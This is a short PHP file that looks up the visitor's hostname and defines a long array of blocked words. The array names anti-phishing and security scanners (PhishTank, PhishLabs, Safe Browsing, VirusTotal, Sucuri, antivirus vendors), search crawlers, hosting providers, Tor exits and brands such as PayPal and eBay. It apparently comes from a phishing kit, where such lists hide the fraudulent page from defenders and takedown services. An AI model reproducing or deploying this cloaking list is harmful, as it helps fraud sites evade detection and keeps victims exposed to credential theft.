<?php

    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    //随便加的防爬
    $blocked_words = array(
            "factioninc",
            "mit.edu",
            "lbot",
            "bannana_bot",
            "zbot",
            "golem",
            "webwombat",
            "xift",
            "theophrastus",
            "metascan",
            "qualys",
            "falcon",
            "sohu",
            "teledata-fttx.de",
            "html index",
            "nhse",
            "trendnet",
            "sysms.net",
            "/teoma",
            "walker",
            "blockone",
            "pbot",
            "enom",
            "phishlabs",
            "scoutjet",
            "coffswifi",
            "shadowserver",
            "homerweb",
            "jetbot",
            "israeli-search",
            "50.nu",
            "senrigan",
            "CL0NA",
            "cdn77",
            "windows 98",
            "yeti",
            "digger",
            "knowledge",
            "kaspersky",
            "nbot",
            "powertech",
            "scrubby",
            "webmonkey",
            "publisher",
            "upcloud.host",
            "glx",
            "tlh.ro",
            "telesp.net.br",
            "tpnet",
            "urlredirectresolver",
            "ezresult",
            "spro",
            "shark",
            "potia",
            "163data",
            "bruuk.sk",
            "drweb",
            "sucuri",
            "monitis.com",
            "stretchoid",
            "marvin/",
            "SiteAdvisor",
            "linode",
            "cassandra",
            "gazz",
            "hostinger",
            "getterroboplus",
            "Macintosh",
            "verticrawl",
            "cusco",
            "artikel10",
            "googlebot.com",
            "orange-labs",
            "genieknows",
            "antbot",
            "web wombat",
            "griffon",
            "li420-167",
            "phishmongers",
            "ferret",
            "cymru",
            "ebot",
            "webstolperer",
            "bezeqint",
            "tfbnw",
            "amazonaws",
            "ibm_planetwide",
            "poneytelecom",
            "datapacket.com",
            "lssrocketcrawler",
            "roadhouse",
            "quttera",
            "zyborg",
            "patric",
            "avira",
            "simtccflow1.etn.com",
            "inspector web",
            "fido",
            "mapoftheinternet",
            "gromit",
            "yandex",
            "fouineur",
            "caiway",
            "htmlgobble",
            "acoonbot",
            "360spider",
            "adressendeutschland",
            "nameprotect",
            "titin",
            "fetchrover",
            "pegasus",
            "baypup",
            "whizbang",
            "kretrieve",
            "moget",
            "ttksever.ru",
            "torservers",
            "netresearchserver",
            "webfoot",
            "messagelabs",
            "vultr",
            "abot",
            "symantec",
            "docomo",
            "yahoo",
            "all.de",
            "safebrowsing",
            "mbot",
            "wallpaper",
            "robofox",
            "amuri.net",
            "speedfind",
            "bruuk",
            "libwww",
            "yanga",
            "raven search",
            "poppelsdorf",
            "phishtank",
            "quintex",
            "plus.net",
            "sannet",
            "dmoz",
            "surfnomore",
            "updated",
            "page_verifier",
            "triolan.net",
            "amuri",
            "nomad",
            "openfind",
            "robbie",
            "scaleway",
            "security",
            "lycos",
            "myweb",
            "osis-project",
            "initiative-s.de",
            "z-telekom",
            "rbot",
            "hamahakki",
            "aboutusbot",
            "fetcher6-2.go.mail.ru",
            "sysms",
            "cisco",
            "netcarta webmap engine",
            "quadranet",
            "netmechanic",
            "charlotte",
            "blog",
            "imagelock",
            "jabber",
            "sbider",
            "iconsurf",
            "muncher",
            "templeton",
            "wavefire",
            "dbot",
            "ccubee",
            "metauri",
            "abelons",
            "stelkom.net",
            "sidewinder",
            "webvac",
            "mwd.search",
            "prcdn",
            "hbot",
            "danpro",
            "colocrossing.com",
            "bjaaland",
            "apx.pub",
            "weblinker",
            "sphere",
            "obot",
            "najdi",
            "esther",
            "ukservers",
            "your-server.de",
            "fish search",
            "stwserver",
            "EBAY",
            "hackercombat",
            "peregrinator",
            "completel",
            "grapnel",
            "ia_archiver",
            "moscow.rt.ru",
            "netsparker",
            "ccanet.co.uk",
            "digitale-gesellschaft",
            "xirq",
            "ebiness",
            "dr.web",
            "popular iconoclast",
            "signal.center",
            "labelgrabber",
            "tarantula",
            "webcatcher",
            "as9105.com",
            "point",
            "cmc",
            "silk",
            "mcafee",
            "felix ide",
            "phising",
            "whowhere",
            "ghst.net",
            "starnet.md",
            "biglotron",
            "booch",
            "roamsite",
            "minsktelecom.by",
            "intelliagent",
            "katipo",
            "rima-td",
            "versanet.de",
            "spinner",
            "multitext",
            "blo.",
            "a6-indexer",
            "tkwww",
            "pageboy",
            "pear.",
            "apercite",
            "miva",
            "szukacz",
            "baidu",
            "ah-ha.com",
            "semanticdiscovery",
            "t-h-u-n-d-e-r-s-t-o-n-e",
            "amznkassocbot",
            "aportworm",
            "coloup",
            "gulliver",
            "anthill",
            "spam",
            "vbot",
            "findlinks",
            "nos-oignons",
            "snooper",
            "motor",
            "SPRO-NET-209-19-128",
            "downnotifier",
            "acoon",
            "toutatis",
            "seek",
            "mj12",
            "avirasof",
            "panscient",
            "zippp",
            "gp4telecom",
            "merzscope",
            "shaihulud",
            "nzexplorer",
            "ish.net.br",
            "mantraagent",
            "kototoi",
            "veripayed",
            "nec-meshexplorer",
            "mercator",
            "clamav",
            "jumpstation",
            "vision-search",
            "nortor",
            "moose",
            "echo blinde kuh",
            "snappy",
            "compatible",
            "avast",
            "arachnophilia",
            "psychz",
            "altavista",
            "suntek",
            "malcare",
            "depspid",
            "mediapartners",
            "gralon",
            "-bot",
            "grub",
            "X11",
            "daumoa",
            "dtaagent",
            "iron33",
            "online-domain-tools",
            "crawl",
            "w3c_validator",
            "shore.net",
            "webreaper",
            "piltdownman",
            "badware",
            "webwalk",
            "hubater",
            "cymru.com",
            "parked.factioninc.com",
            "mailshell",
            "churl",
            "indexer",
            "link validator",
            "udmsearch",
            "outlook",
            "adsbot-google",
            "blaiz",
            "deepindex",
            "amagit.com",
            "tutorgig",
            "internet shinchakubin",
            "comagent",
            "salty",
            "geosr",
            "skymob.com",
            "cfetch",
            "poppi",
            "architext",
            "progtech.ru",
            "acsalaska",
            "hku www octopus",
            "ipredator",
            "bradley",
            "worldlight",
            "orb search",
            "digiweb",
            "(bot",
            "victoria",
            "bot",
            "noyona",
            "pgp key agent",
            "iltrovatore",
            "deweb",
            "grabber",
            "telekom.rs",
            "websitepulse",
            "incywincy",
            "ip3000",
            "valkyrie",
            "digitalcourage",
            "fireball",
            "blackwidow",
            "trustwave",
            "newscan-online",
            "aruba",
            "ebingbong",
            "lockon",
            "nodemeter.net",
            "startdedicated",
            "orange-labs.fr",
            "dreamhost",
            "speedtravel",
            "sift",
            "web core",
            "malwaretips",
            "planet.nl",
            "metadefender",
            "ncsa beta",
            "hilfe-veripayed.com",
            "eurohoster",
            "microsoft url control",
            "wanderer",
            "vagabondo",
            "cyberinfo",
            "arabot",
            "fireeye",
            "helix",
            "netpilot",
            "Dr.Web",
            "aboundexbot",
            "ip-backbone",
            "192.comagent",
            "htdig",
            "spider",
            "staircaseirony",
            "lachesis",
            "accoona",
            "appie",
            "webinspector",
            "fkraus",
            "pack rat",
            "jetbrains",
            "ichiro",
            "scanurl",
            "systems",
            "t-rex",
            "computingsite",
            "development",
            "apache-httpclient",
            "eset",
            "linode.com",
            "btcentralplus",
            "ybot",
            "suke",
            "atlocal",
            "antivirus",
            "larbin",
            "sg-scout",
            "reverse",
            "usabroadband",
            "pogodak",
            "bot/",
            "unknown.telecom.gomel.by",
            "bdfetch",
            "arks",
            "mailscanner",
            "paradisenetworks",
            "200pleasebot",
            "008",
            "xenu",
            "aquaray",
            "pimptrain",
            "kdd-explorer",
            "facebook",
            "pagepeeker",
            "yodao",
            "search.",
            "picosearch",
            "admantx",
            "alexabot",
            "scnet",
            "cienciaficcion",
            "abrave spider",
            "p3pwgdsn",
            "voyager-hc",
            "prtelecom",
            "volcano",
            "road runner",
            "araneo",
            "site valet",
            "twttr",
            "supersnooper",
            "ditto",
            "ahoy",
            "partnersite",
            "4seohuntbot",
            "boitho",
            "emacs-w3 search engine",
            "nokia6682/",
            "ejupiter",
            "roach",
            "image.kapsi.net",
            "Trident",
            "informant",
            "acunetix",
            "tor-exit",
            "duckduck",
            "sven",
            "proxy-node",
            "phpdig",
            "searchprocess",
            "siteguarding",
            "oracle",
            "ibercom",
            "google",
            "msnbot",
            "hosting",
            ":bot",
            "BitDefender",
            "wwwc",
            "weblog monitor",
            "site searcher",
            "ztomy",
            "avg",
            "afterplayy",
            "outlook!",
            "anonymizing-proxy",
            "javabee",
            "spyder",
            "hicoria.com",
            "babylon.network",
            "iam.net.ma",
            "_bot",
            "aretha",
            "minirank",
            "btcentralplus.com",
            "heritrix",
            "delorie",
            "hotmail",
            "kilroy",
            "tach black widow",
            "butterfly",
            "netscoop",
            "cloudflare",
            "web hopper",
            "webbandit",
            "hyper-decontextualizer",
            "wauuu",
            "funnelweb",
            "nationaldirectory",
            "enta.net",
            "csci",
            "w3m2",
            "yahoo!",
            "big brother",
            "Level3",
            "les.net",
            "apple.com",
            "is74.ru",
            "phantom",
            "simmany",
            "zare",
            "evliya celebi",
            "mpdedicated.com",
            "ingrid",
            "cs.vt.edu",
            "linkscan",
            "pinpoint",
            "muscatferret",
            "websnarf",
            "vsnl.net.in",
            "monster",
            "hinet",
            "kasserver",
            "TweetmemeBot",
            "azure",
            "curl",
            "die blinde kuh",
            "combine",
            "sygol",
            "geturl",
            "goforit",
            "twiceler",
            "nutch",
            "centralnic",
            "lipperhey",
            "virustotal",
            "infoweb.ne.jp",
            "prcdn.net",
            "addthis.com",
            "dancehelp",
            "007ac9",
            "ananzi",
            "above",
            "atn",
            "sl-reverse.com",
            "msn!",
            "linkalarm",
            "mnogosearch",
            "rambler",
            "calif",
            "sbot",
            "parasite",
            "ucsd",
            "msn",
            "rules",
            "jakarta",
            "bitdefender",
            "mediafox",
            "pompos",
            "wach-it-solutions",
            "researchscan",
            "feedfetcher",
            "objectssearch",
            "dwcp",
            "gcreep",
            "kyivstar.net",
            "dyn.plus.net",
            "webcopy",
            "voyager/",
            "lwp",
            "e-active.nl",
            "slurp",
            "SPRO-NET-207-70-0",
            "titan",
            "sucuri.net",
            "arale",
            "opendns",
            "poirot",
            "datasift",
            "redbackinternet",
            "phpnet",
            "upcbusiness",
            "versanet",
            "surriel.com",
            "html_analyzer",
            "ovh",
            "webzinger",
            "wind.it",
            "comrise.ru",
            "tor.exit",
            "twitter",
            "nod32",
            "webmirror",
            "webquest",
            "digitalcourage.de",
            "psycheclone",
            "smartwit",
            "analytics",
            "nederland.zoek",
            "pagebull",
            "backrub",
            "sleek",
            "legs",
            "/bot",
            "jack",
            "comodo",
            "nazilla",
            "intelnet.net.gt",
            "augurfind",
            "wild ferret",
            "sitetech-rover",
            "bloodhound",
            "solutions",
            "colocrossing",
            "havindex",
            "pioneer",
            "hkdata",
            "openintelligencedata",
            "omni",
            "ahrefsbot",
            "majestic12",
            "open text",
            "scooter",
            "kbot",
            "e-collector",
            "crawler",
            "miniature",
            "mattie",
            "cyveillance",
            "sna-",
            "sphider",
            "trendmicro",
            "aranha",
            ".bot",
            "plumtreewebaccessor",
            "webwatch",
            "teledata-fttx",
            "piranha",
            "hinet.net",
            "twisted",
            "occam",
            "asterias",
            "download express",
            "windows 95",
            "w3mir",
            "telecomitalia",
            "sitecheck2",
            "steeler/",
            "inktomisearch.com",
            "python",
            "paypal",
            "infobee",
            "collective",
            "netcraft",
            "harvest",
            "euskaltel",
            "calyxinstitute",
            "rescan",
            "uscc",
            "greyponyit",
            "ebay",
            "robozilla",
            "zao/",
            "surriel",
            "url check",
            "zoot",
            "accelobot",
            "tbot",
            "bot.",
            "enn.lu",
            "weblayers",
            "wget",
            "wwwster",
            "phishing",
            "pacbell",
            "atomz",
            "xmission",
            "impium",
            "solnet.ch",
            "shopwiki",
            "xget",
            "citynethost",
            "barracuda",
            "uptimerobot.com",
            "softlayer",
            "100tb",
            "ivia",
            "hotmail!",
            "ovh.net",
            "vodafone",
            "magpie"

    );

    
 ?>